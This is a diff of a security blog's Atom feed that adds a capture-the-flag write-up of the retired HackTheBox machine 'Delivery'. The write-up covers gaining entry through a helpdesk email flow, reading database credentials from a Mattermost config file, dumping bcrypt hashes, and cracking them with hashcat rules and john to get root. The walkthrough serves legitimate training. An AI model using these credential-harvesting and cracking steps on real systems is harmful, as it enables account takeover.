@@ -1,5 +1,195 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-16T09:40:00+02:00</updated><entry><title>HTB: Laboratory</title><link href="https://maggick.fr/2021/05/htb-laboratory.html" rel="alternate"></link><published>2021-05-16T09:40:00+02:00</published><updated>2021-05-16T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-laboratory.html</id><summary type="html">&lt;p&gt;&lt;img alt="Laboratory Card" class="align-left" src="/media/2021.05/laboratory_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-24T09:40:00+02:00</updated><entry><title>HTB: Delivery</title><link href="https://maggick.fr/2021/05/htb-delivery.html" rel="alternate"></link><published>2021-05-24T09:40:00+02:00</published><updated>2021-05-24T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-24:/2021/05/htb-delivery.html</id><summary type="html">&lt;p&gt;&lt;img alt="Delivery card" class="align-left" src="/media/2021.05/delivery_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/308"&gt;Delivery&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/3769"&gt;ippsec&lt;/a&gt; and publish on
+January 9 2021.
+This box is classified as an easy machine. The user part involve to understand a
+process and exploit some functionnal flow.
+The root part implies enumeration and cracking somes hashes binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/delivery_card.png" alt="Delivery card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/308"&gt;Delivery&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/3769"&gt;ippsec&lt;/a&gt; and publish on
+January 9 2021.
+This box is classified as an easy machine. The user part involve to understand a
+process and exploit some functionnal flow.
+The root part implies enumeration and cracking somes hashes binary.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Feb 13 08:48:43 2021 as: nmap -sSV -oN nmap 10.129.95.75&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.95.75&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 998 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    nginx 1.14.2&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sat Feb 13 08:48:51 2021 -- 1 IP address (1 host up) scanned in 7.42 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;&lt;img alt="Homepage" src="/media/2021.05/delivery_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the "contact-us" section we discover that we will probably need a
+email adresse on the "delivery.htb" domain in order to access the MatterMost
+server.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We got to the help desk page.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="help desk page" src="/media/2021.05/delivery_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We create a ticket and got an associated email adresse with the &lt;ticket number&gt;@delivery.htb&lt;/p&gt;
+&lt;p&gt;&lt;img alt="associated email address" src="/media/2021.05/delivery_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;we create an account on mettermost with this email and got the verification URL on the ticket&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Registering on mattermost email" src="/media/2021.05/delivery_035.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="mattermost verification link" src="/media/2021.05/delivery_04.png"&gt;&lt;/p&gt;
+&lt;p&gt;The discussion give us the creds for the OSTicket application and disclose some info about password reuse&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;root
+9:29 AM&lt;/p&gt;
+&lt;p&gt;@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!&lt;/p&gt;
+&lt;p&gt;Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+root
+10:58 AM&lt;/p&gt;
+&lt;p&gt;PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We can now access the OSticket panel as an admin using the agent panel http://helpdesk.delivery.htb/scp/login.php&lt;/p&gt;
+&lt;p&gt;&lt;img alt="OSticket panel" src="/media/2021.05/delivery_05.png"&gt;&lt;/p&gt;
+&lt;p&gt;The mailideriverer account also got an SSH account on the box which allow us to
+get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh maildeliverer@delivery.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;maildeliverer@delivery.htb&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;maildeliverer@Delivery:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;2300770247a4dfb6f57de6d717d86b9c&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We enumerate our user permission and found the MatterMost configuration file
+containing the crendentials to access the database&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json&lt;/span&gt;
+&lt;span class="code-line"&gt;{&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;quot;ServiceSettings&amp;quot;: {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;SiteURL&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;WebsocketURL&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;LicenseFileLocation&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;ListenAddress&amp;quot;: &amp;quot;:8065&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;ConnectionSecurity&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;TLSCertFile&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  },&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;quot;SqlSettings&amp;quot;: {&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;DriverName&amp;quot;: &amp;quot;mysql&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;DataSource&amp;quot;: &amp;quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&amp;quot;,&lt;/span&gt;
+&lt;span class="code-line"&gt;        &amp;quot;DataSourceReplicas&amp;quot;: [],&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We connect to the mysql database, enumerate the tables and dump the users and
+password from the &lt;code&gt;Users&lt;/code&gt; table.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ #mmuser:Crack_The_MM_Admin_PW&lt;/span&gt;
+&lt;span class="code-line"&gt;maildeliverer@Delivery:~$ mysql -u mmuser -p&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter password:&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/span&gt;
+&lt;span class="code-line"&gt;Your MariaDB connection id is 382&lt;/span&gt;
+&lt;span class="code-line"&gt;Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Type &amp;#39;help;&amp;#39; or &amp;#39;\h&amp;#39; for help. Type &amp;#39;\c&amp;#39; to clear the current input statement.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; show database&lt;/span&gt;
+&lt;span class="code-line"&gt;    -&amp;gt; ;&lt;/span&gt;
+&lt;span class="code-line"&gt;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;#39;database&amp;#39; at line 1&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; SHOW DATABASES;&lt;/span&gt;
+&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| Database           |&lt;/span&gt;
+&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| information_schema |&lt;/span&gt;
+&lt;span class="code-line"&gt;| mattermost         |&lt;/span&gt;
+&lt;span class="code-line"&gt;+--------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;2 rows in set (0.001 sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [(none)]&amp;gt; use mattermost;&lt;/span&gt;
+&lt;span class="code-line"&gt;Reading table information for completion of table and column names&lt;/span&gt;
+&lt;span class="code-line"&gt;You can turn off this feature to get a quicker startup with -A&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Database changed&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; show tables;&lt;/span&gt;
+&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| Tables_in_mattermost   |&lt;/span&gt;
+&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| Audits                 |&lt;/span&gt;
+&lt;span class="code-line"&gt;| Bots                   |&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;| UserAccessTokens       |&lt;/span&gt;
+&lt;span class="code-line"&gt;| UserGroups             |&lt;/span&gt;
+&lt;span class="code-line"&gt;| UserTermsOfService     |&lt;/span&gt;
+&lt;span class="code-line"&gt;| Users                  |&lt;/span&gt;
+&lt;span class="code-line"&gt;+------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;46 rows in set (0.001 sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; select Username,Password from Users;&lt;/span&gt;
+&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| Username                         | Password                                                     |&lt;/span&gt;
+&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;| surveybot                        |                                                              |&lt;/span&gt;
+&lt;span class="code-line"&gt;| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |&lt;/span&gt;
+&lt;span class="code-line"&gt;| john5412663                      | $2a$10$hF3jgrGBPYT2LaXISy67K.lAaTNaOKJfruZTWSzQo..ZI9dHctf7a |&lt;/span&gt;
+&lt;span class="code-line"&gt;| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |&lt;/span&gt;
+&lt;span class="code-line"&gt;| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |&lt;/span&gt;
+&lt;span class="code-line"&gt;| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |&lt;/span&gt;
+&lt;span class="code-line"&gt;| channelexport                    |                                                              |&lt;/span&gt;
+&lt;span class="code-line"&gt;| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |&lt;/span&gt;
+&lt;span class="code-line"&gt;| john                             | $2a$10$.uKtro1Yc15ZycqOJX1X/.m6yg7VSD60EUV58BJ4SVgg0xsYzrKe2 |&lt;/span&gt;
+&lt;span class="code-line"&gt;+----------------------------------+--------------------------------------------------------------+&lt;/span&gt;
+&lt;span class="code-line"&gt;9 rows in set (0.000 sec)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;MariaDB [mattermost]&amp;gt; exit&lt;/span&gt;
+&lt;span class="code-line"&gt;Bye&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We create a dictionary using the disclosed password and using &lt;code&gt;hashcat&lt;/code&gt; rules we
+generate a few variations.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ cat dic&lt;/span&gt;
+&lt;span class="code-line"&gt;PleaseSubscribe!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ hashcat --force dic -r /usr/share/hashcat/rules/best64.rule --stdout &amp;gt; dic_hc&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We pass this variation dictionary to &lt;code&gt;john&lt;/code&gt; with the database hashes, and found
+a password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=dic_hc&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;bcrypt&amp;quot;, but the string is also recognized as &amp;quot;bcrypt-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=bcrypt-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X3])&lt;/span&gt;
+&lt;span class="code-line"&gt;Cost 1 (iteration count) is 1024 for all loaded hashes&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;PleaseSubscribe!21 (?)&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: Only 5 candidates left, minimum 24 needed for performance.&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:02 DONE (2021-02-13 17:19) 0.3424g/s 26.36p/s 182.8c/s 182.8C/s asP..PeSubs&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use this password to long as root on the box and get the final flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;maildeliverer@Delivery:~$ su&lt;/span&gt;
+&lt;span class="code-line"&gt;Password:&lt;/span&gt;
+&lt;span class="code-line"&gt;root@Delivery:/home/maildeliverer# cd&lt;/span&gt;
+&lt;span class="code-line"&gt;root@Delivery:~# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;09679395029c940e9acea1ceab2cf76a&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A really interesting an realistic box. There is no technical vulnerability or
+exploit to use here. Just reading the applications and understanding what is
+needed and found a way to achieve our attacker goal.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="john"></category></entry><entry><title>HTB: Laboratory</title><link href="https://maggick.fr/2021/05/htb-laboratory.html" rel="alternate"></link><published>2021-05-16T09:40:00+02:00</published><updated>2021-05-16T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-laboratory.html</id><summary type="html">&lt;p&gt;&lt;img alt="Laboratory Card" class="align-left" src="/media/2021.05/laboratory_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/298"&gt;Laboratory&lt;/a&gt; publish on
 November 14, 2020 by
